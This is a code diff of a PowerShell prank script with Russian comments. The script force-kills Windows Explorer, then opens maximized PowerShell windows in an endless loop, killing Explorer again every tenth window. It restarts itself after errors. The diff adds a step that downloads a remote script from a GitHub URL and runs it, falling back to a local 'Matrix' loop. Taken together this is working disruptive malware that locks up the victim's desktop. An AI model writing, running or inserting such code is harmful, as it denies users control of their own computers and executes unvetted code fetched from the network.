@@ -1,14 +1,32 @@
 # Немедленно убиваем Explorer
 Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
 
-# Функция для создания матричного окна
+# Функция для создания матричного окна с настоящей матрицей
 function New-MatrixWindow {
     param($windowId)
     
-    $matrixCode = @'
+    $matrixUrl = "https://raw.githubusercontent.com/mathieures/Posh-Matrix/refs/heads/main/Start-Matrix.ps1"
+    
+    try {
+        # Загружаем настоящий скрипт матрицы
+        $matrixScript = Invoke-RestMethod -Uri $matrixUrl -ErrorAction Stop
+        
+        # Сохраняем во временный файл
+        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+        Set-Content -Path $tempScript -Value $matrixScript
+        
+        # Запускаем настоящее окно матрицы
+        Start-Process powershell -ArgumentList @(
+            "-NoExit",
+            "-WindowStyle", "Maximized",
+            "-File", "`"$tempScript`""
+        )
+    }
+    catch {
+        # Fallback на локальную матрицу если не удалось загрузить
+        $fallbackCode = @'
 while ($true) {
     $w = $host.UI.RawUI.WindowSize.Width
-    $h = $host.UI.RawUI.WindowSize.Height
     $chars = "01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     
     for ($i = 0; $i -lt $w; $i++) {
@@ -16,27 +34,30 @@ while ($true) {
         $color = @('Green','DarkGreen','White','Gray') | Get-Random
         Write-Host $char -ForegroundColor $color -NoNewline
     }
+    Write-Host ""
     Start-Sleep -Milliseconds 30
 }
 '@
-
-    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
-    Set-Content -Path $tempScript -Value $matrixCode
-    
-    Start-Process powershell -ArgumentList @(
-        "-NoExit",
-        "-WindowStyle", "Maximized",
-        "-File", "`"$tempScript`""
-    )
+        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+        Set-Content -Path $tempScript -Value $fallbackCode
+        
+        Start-Process powershell -ArgumentList @(
+            "-NoExit",
+            "-WindowStyle", "Maximized",
+            "-File", "`"$tempScript`""
+        )
+    }
 }
 
 # Главный бесконечный цикл
 $count = 1
 do {
-    # Закрываем Explorer
-    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
+    # Периодически закрываем Explorer (каждые 10 окон)
+    if ($count % 10 -eq 0) {
+        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
+    }
     
-    # Создаем окно с матрицей
+    # Создаем окно с настоящей матрицей
     New-MatrixWindow -windowId $count
     $count++
     
@@ -52,7 +73,7 @@ do {
     
 } while ($true)
 
-# Вечная защита
+# Вечная защита - самовосстановление при ошибках
 trap {
     Start-Sleep -Seconds 3
     & $MyInvocation.MyCommand.Path
